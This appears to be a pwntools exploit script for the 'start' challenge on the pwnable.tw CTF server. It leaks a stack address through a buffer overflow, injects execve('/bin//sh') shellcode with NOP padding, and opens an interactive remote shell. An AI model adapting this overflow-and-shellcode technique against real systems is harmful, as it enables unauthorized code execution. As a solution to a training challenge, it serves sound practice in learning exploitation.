#! /usr/bin/python
from pwn import *

#r = process('./start')
r = remote('chall.pwnable.tw',10000)
#context.log_level='debug'

#gdb.attach(r,'b* 0x08048097')


payload1 = ''
payload1 += 'A'*20
payload1 += p32(0x08048087)

r.sendafter("Let's start the CTF:",payload1)

leak = r.recv(4)
stack_addr = u32(leak)
success('stack_addr = '+hex(stack_addr))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"+"\x68\x68\x2f\x62\x69\x6e\x89"+"\xe3\x89\xc1\x89\xc2\xb0\x0b"+"\xcd\x80\x31\xc0\x40\xcd\x80"

payload2 = ''
payload2 += '\x90'*20
payload2 += p32(stack_addr+20)
payload2 += shellcode
r.send(payload2)


r.interactive()